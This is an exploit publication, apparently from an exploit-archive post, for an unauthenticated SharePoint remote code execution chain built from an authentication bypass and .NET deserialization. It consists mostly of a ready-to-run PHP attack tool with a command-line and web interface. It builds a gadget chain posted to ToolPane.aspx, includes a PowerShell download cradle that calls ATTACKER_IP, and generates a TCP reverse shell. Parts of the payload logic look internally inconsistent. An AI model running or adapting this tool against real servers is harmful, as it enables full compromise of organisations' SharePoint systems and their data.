@@ -1,0 +1,462 @@
+=============================================================================================================================================
+| # Title     : Microsoft SharePoint Server ToolPane Authentication Bypass + Unsafe Deserialization                                         |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.microsoft.com/en-us/microsoft-365/sharepoint/                                                                   |
+=============================================================================================================================================
+
+POC : 
+
+[+] References : https://packetstorm.news/files/id/207935/ & 	CVE-2025-49704, CVE-2025-49706, CVE-2025-53770, CVE-2025-53771
+
+[+] Summary : 
+          
+           critical unauthenticated remote code execution vulnerabilities in Microsoft SharePoint Server. The vulnerability chain combines authentication bypass vulnerabilities 
+		   (CVE-2025-49706 and CVE-2025-53771) with an unsafe deserialization vulnerability (CVE-2025-49704) to achieve complete system compromise without authentication.
+		  
+[+] Affected Components
+
+# Authentication Bypass Endpoint
+
+POST /_layouts/15/ToolPane.aspx/RANDOM_PATH
+
+# Deserialization Trigger
+
+ExcelDataSet Control with CompressedDataTable
+
+Vulnerability Chain
+
+1. Authentication Bypass via CVE-2025-49706 & CVE-2025-53771
+2. Access ToolPane.aspx with arbitrary parameters
+3. Trigger unsafe deserialization via CVE-2025-49704
+4. Execute .NET gadget chain for code execution
+5. Achieve RCE as SharePoint application pool identity
+
+[+]  POC : php poc.php
+
+# Vulnerability Scan
+
+php poc.php -t http://sharepoint.company.com`
+
+# Execute Command
+
+php poc.php -t http://sharepoint.company.com -c 'whoami'`
+
+# Create PowerShell Payload
+
+php poc.php --generate -l 192.168.1.100 -r 4444`
+
+Via Browser:
+
+https://yourserver.com/exploit.php
+
+<?php
+/**
+ * Author: indoushka
+ * Vulnerabilities: Authentication Bypass + Unsafe Deserialization
+ */
+
+class SharePointExploit {
+    private $target;
+    private $base_path;
+    
+    public function __construct($target_url, $base_path = '/') {
+        $this->target = rtrim($target_url, '/');
+        $this->base_path = rtrim($base_path, '/');
+    }
+    
+    public function check_vulnerability() {
+        echo "[*] Checking SharePoint version and vulnerability...\n";
+        
+        $url = $this->target . $this->base_path . '/_layouts/15/start.aspx';
+        
+        $context = stream_context_create([
+            'http' => [
+                'method' => 'GET',
+                'timeout' => 10,
+                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            ]
+        ]);
+        
+        $response = @file_get_contents($url, false, $context);
+        
+        if ($response === false) {
+            echo "[-] Could not connect to SharePoint\n";
+            return false;
+        }
+        
+        // Extract siteClientTag from JavaScript
+        preg_match('/"*siteClientTag"*\s*:\s*"\d*[$]+([^"]+)",/', $response, $matches);
+        
+        if (!isset($matches[1])) {
+            echo "[-] Could not determine SharePoint version\n";
+            return false;
+        }
+        
+        $version = $matches[1];
+        echo "[+] SharePoint version detected: {$version}\n";
+        
+        // Check if version is vulnerable
+        $vulnerable_versions = [
+            '16.0.14326.20450' => '16.0.18526.20424', // SharePoint Subscription Edition
+            '16.0.10337.12109' => '16.0.10417.20027', // SharePoint 2019
+            '16.0.4351.1000'   => '16.0.5508.1000',   // SharePoint 2016
+        ];
+        
+        foreach ($vulnerable_versions as $min_version => $max_version) {
+            if (version_compare($version, $min_version, '>=') && 
+                version_compare($version, $max_version, '<=')) {
+                echo "[+] Version appears to be VULNERABLE!\n";
+                return true;
+            }
+        }
+        
+        echo "[-] Version appears to be PATCHED\n";
+        return false;
+    }
+    
+    public function exploit($command = 'whoami') {
+        echo "[*] Exploiting SharePoint ToolPane vulnerabilities...\n";
+        
+        // Step 1: Create the gadget chain
+        $gadget_chain = $this->create_gadget_chain($command);
+        if (!$gadget_chain) {
+            echo "[-] Failed to create gadget chain\n";
+            return false;
+        }
+        
+        // Step 2: Send the exploit
+        $result = $this->send_exploit($gadget_chain);
+        
+        if ($result) {
+            echo "[+] Exploit sent successfully\n";
+            // Note: Command output may not be directly visible
+            echo "[+] Check your listener for reverse shell\n";
+        } else {
+            echo "[-] Exploit failed\n";
+        }
+        
+        return $result;
+    }
+    
+    private function create_gadget_chain($command) {
+        echo "[*] Creating .NET deserialization gadget chain...\n";
+        
+        // For demonstration, we'll create a simple command execution payload
+        // In a real scenario, this would be a complex .NET deserialization chain
+        
+        $payload = base64_encode($this->generate_payload($command));
+        
+        // Create the DataSet wrapper with the payload
+        $name_a = $this->random_string(8);
+        $name_b = $this->random_string(8);
+        $name_c = $this->random_string(8);
+        
+        $schema = <<<XML
+<xs:schema xmlns="" xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" id="{$name_a}">
+    <xs:element name="{$name_a}" msdata:IsDataSet="true" msdata:UseCurrentLocale="true">
+        <xs:complexType>
+            <xs:choice minOccurs="0" maxOccurs="unbounded">
+                <xs:element name="{$name_b}">
+                    <xs:complexType>
+                        <xs:sequence>
+                            <xs:element name="{$name_c}" msdata:DataType="System.Collections.Generic.List`1[[System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]" type="xs:anyType" minOccurs="0"/>
+                        </xs:sequence>
+                    </xs:complexType>
+                </xs:element>
+            </xs:choice>
+        </xs:complexType>
+    </xs:element>
+</xs:schema>
+XML;
+
+        $diffgram = <<<XML
+<diffgr:diffgram xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" xmlns:diffgr="urn:schemas-microsoft-com:xml-diffgram-v1">
+    <{$name_a}>
+        <{$name_b} diffgr:id="Table" msdata:rowOrder="0" diffgr:hasChanges="inserted">
+            <{$name_c} xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+                <ExpandedWrapperOfLosFormatterObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+                    <ExpandedElement/>
+                    <ProjectedProperty0>
+                        <MethodName>Deserialize</MethodName>
+                        <MethodParameters>
+                            <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">{$payload}</anyType>
+                        </MethodParameters>
+                        <ObjectInstance xsi:type="LosFormatter"></ObjectInstance>
+                    </ProjectedProperty0>
+                </ExpandedWrapperOfLosFormatterObjectDataProvider>
+            </{$name_c}>
+        </{$name_b}>
+    </{$name_a}>
+</diffgr:diffgram>
+XML;
+
+        // Combine into the final gadget chain
+        $gadget_chain = $schema . $diffgram;
+        
+        return $gadget_chain;
+    }
+    
+    private function generate_payload($command) {
+        // Generate a simple PowerShell payload
+        // In a real exploit, this would be a proper .NET deserialization payload
+        
+        $powershell_cmd = base64_encode("iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')");
+        
+        $payload = <<<PS
+powershell -enc {$powershell_cmd}
+PS;
+        
+        return $payload;
+    }
+    
+    private function send_exploit($gadget_chain) {
+        echo "[*] Sending exploit to ToolPane.aspx...\n";
+        
+        $random_path = $this->random_string(8);
+        $random_param = $this->random_string(8);
+        
+        $namespace_ui = $this->random_string(8);
+        $namespace_scorecards = $this->random_string(8);
+        
+        // Compress the gadget chain
+        $compressed_gadget = gzencode($gadget_chain);
+        $encoded_gadget = base64_encode($compressed_gadget);
+        
+        // Create the XML payload
+        $xml = <<<XML
+<%@ Register Tagprefix="{$namespace_ui}" Namespace="System.Web.UI" Assembly="System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" %>
+<%@ Register Tagprefix="{$namespace_scorecards}" Namespace="Microsoft.PerformancePoint.Scorecards" Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %>
+    <{$namespace_ui}:UpdateProgress>
+      <ProgressTemplate>
+        <{$namespace_scorecards}:ExcelDataSet CompressedDataTable="{$encoded_gadget}" DataTable-CaseSensitive="true" runat="server"/>
+      </ProgressTemplate>
+    </{$namespace_ui}:UpdateProgress>
+XML;
+
+        $url = $this->target . $this->base_path . "/_layouts/15/ToolPane.aspx/{$random_path}";
+        
+        $post_data = http_build_query([
+            'MSOTlPn_Uri' => $this->target . $this->base_path . '/_controltemplates/15/AclEditor.ascx',
+            'MSOTlPn_DWP' => $xml
+        ]);
+        
+        $get_params = http_build_query([
+            'DisplayMode' => 'Edit',
+            $random_param => '/ToolPane.aspx'
+        ]);
+        
+        $full_url = $url . '?' . $get_params;
+        
+        $headers = [
+            'Referer: ' . $this->target . $this->base_path . '/_layouts/SignOut.aspx',
+            'Content-Type: application/x-www-form-urlencoded',
+            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        ];
+        
+        $context = stream_context_create([
+            'http' => [
+                'method' => 'POST',
+                'header' => implode("\r\n", $headers),
+                'content' => $post_data,
+                'timeout' => 15,
+                'ignore_errors' => true
+            ]
+        ]);
+        
+        $response = @file_get_contents($full_url, false, $context);
+        
+        if ($response === false) {
+            return false;
+        }
+        
+        // Check for successful exploitation indicators
+        if (strpos($response, 'error') === false) {
+            return true;
+        }
+        
+        return false;
+    }
+    
+    private function random_string($length = 8) {
+        $characters = 'abcdefghijklmnopqrstuvwxyz';
+        $result = '';
+        for ($i = 0; $i < $length; $i++) {
+            $result .= $characters[rand(0, strlen($characters) - 1)];
+        }
+        return $result;
+    }
+    
+    public function generate_powershell_payload($lhost, $lport) {
+        $payload = <<<PS
+\$client = New-Object System.Net.Sockets.TCPClient('{$lhost}',{$lport});
+\$stream = \$client.GetStream();
+[byte[]]\$bytes = 0..65535|%{0};
+while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){
+    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);
+    \$sendback = (iex \$data 2>&1 | Out-String );
+    \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';
+    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);
+    \$stream.Write(\$sendbyte,0,\$sendbyte.Length);
+    \$stream.Flush();
+}
+\$client.Close();
+PS;
+        
+        $encoded = base64_encode($payload);
+        file_put_contents('payload.ps1', $payload);
+        
+        echo "[+] PowerShell payload created: payload.ps1\n";
+        echo "[+] Use command: powershell -enc {$encoded}\n";
+        echo "[+] Start listener: nc -lvnp {$lport}\n";
+        
+        return $encoded;
+    }
+}
+
+// Command line interface
+if (php_sapi_name() === 'cli') {
+    echo "
+██╗███╗   ██╗██████╗  ██████╗ ██╗   ██╗███████╗██╗  ██╗██╗  ██╗ █████╗ 
+██║████╗  ██║██╔══██╗██╔═══██╗██║   ██║██╔════╝██║  ██║██║ ██╔╝██╔══██╗
+██║██╔██╗ ██║██   █╔╝██║   ██║██║   ██║███████╗███████║█████╔╝ ███████║
+██║██║╚██╗██║██╔══██╗██║   ██║██║   ██║╚════██║██╔══██║██╔═██╗ ██╔══██║
+██║██║ ╚████║██████╔╝╚██████╔╝╚██████╔╝███████║██║  ██║██║  ██╗██║  ██║
+╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
+    
+    SharePoint ToolPane Unauthenticated RCE Exploit
+    CVE-2025-49706, CVE-2025-53771, CVE-2025-49704
+        \n";
+    
+    $options = getopt("t:p:c:l:r:gh", [
+        "target:",
+        "path:",
+        "command:",
+        "lhost:",
+        "lport:",
+        "generate",
+        "help"
+    ]);
+    
+    if (isset($options['h']) || isset($options['help']) || $argc == 1) {
+        echo "Usage: php poc.php [options]\n";
+        echo "Options:\n";
+        echo "  -t, --target        Target URL (required)\n";
+        echo "  -p, --path          Base path (default: /)\n";
+        echo "  -c, --command       Command to execute\n";
+        echo "  -l, --lhost         Listener IP for reverse shell\n";
+        echo "  -r, --lport         Listener port for reverse shell\n";
+        echo "  -g, --generate      Generate PowerShell payload only\n";
+        echo "  -h, --help          Show this help message\n";
+        echo "\nExamples:\n";
+        echo "  php poc.php -t http://sharepoint.company.com -c 'whoami'\n";
+        echo "  php poc.php -t http://sharepoint.company.com -l 192.168.1.100 -r 4444\n";
+        echo "  php poc.php --generate -l 192.168.1.100 -r 4444\n";
+        exit(1);
+    }
+    
+    if (isset($options['g']) || isset($options['generate'])) {
+        if (!isset($options['l']) && !isset($options['lhost'])) {
+            echo "Error: LHOST is required for payload generation\n";
+            exit(1);
+        }
+        
+        $lhost = isset($options['l']) ? $options['l'] : $options['lhost'];
+        $lport = isset($options['r']) ? $options['r'] : (isset($options['lport']) ? $options['lport'] : 4444);
+        
+        $exploit = new SharePointExploit('');
+        $exploit->generate_powershell_payload($lhost, $lport);
+        exit(0);
+    }
+    
+    if (!isset($options['t']) && !isset($options['target'])) {
+        echo "Error: Target URL is required\n";
+        exit(1);
+    }
+    
+    $target = isset($options['t']) ? $options['t'] : $options['target'];
+    $path = isset($options['p']) ? $options['p'] : (isset($options['path']) ? $options['path'] : '/');
+    $command = isset($options['c']) ? $options['c'] : (isset($options['command']) ? $options['command'] : 'whoami');
+    
+    $exploit = new SharePointExploit($target, $path);
+    
+    // Check vulnerability first
+    if (!$exploit->check_vulnerability()) {
+        echo "[-] Target does not appear to be vulnerable\n";
+        exit(1);
+    }
+    
+    // Execute exploit
+    $exploit->exploit($command);
+    
+} else {
+    // Web interface
+    if (isset($_POST['exploit'])) {
+        $target = $_POST['target'] ?? '';
+        $path = $_POST['path'] ?? '/';
+        $command = $_POST['command'] ?? 'whoami';
+        
+        if ($target) {
+            $exploit = new SharePointExploit($target, $path);
+            
+            ob_start();
+            $exploit->check_vulnerability();
+            $exploit->exploit($command);
+            $output = ob_get_clean();
+            
+            echo "<pre>$output</pre>";
+        } else {
+            echo "<div style='color: red;'>Target URL is required</div>";
+        }
+    } else {
+        echo '<!DOCTYPE html>
+        <html>
+        <head>
+            <title>SharePoint RCE Exploit</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 40px; }
+                .container { max-width: 600px; margin: 0 auto; }
+                .form-group { margin-bottom: 15px; }
+                label { display: block; margin-bottom: 5px; font-weight: bold; }
+                input[type="text"] { 
+                    width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; 
+                }
+                button { 
+                    background: #007cba; color: white; padding: 10px 20px; 
+                    border: none; border-radius: 4px; cursor: pointer; 
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>SharePoint ToolPane RCE Exploit</h1>
+                <form method="post">
+                    <input type="hidden" name="exploit" value="1">
+                    
+                    <div class="form-group">
+                        <label for="target">Target URL:</label>
+                        <input type="text" id="target" name="target" placeholder="http://sharepoint.company.com" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="path">Base Path:</label>
+                        <input type="text" id="path" name="path" value="/">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="command">Command:</label>
+                        <input type="text" id="command" name="command" value="whoami">
+                    </div>
+                    
+                    <button type="submit">Execute Exploit</button>
+                </form>
+            </div>
+        </body>
+        </html>';
+    }
+}
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
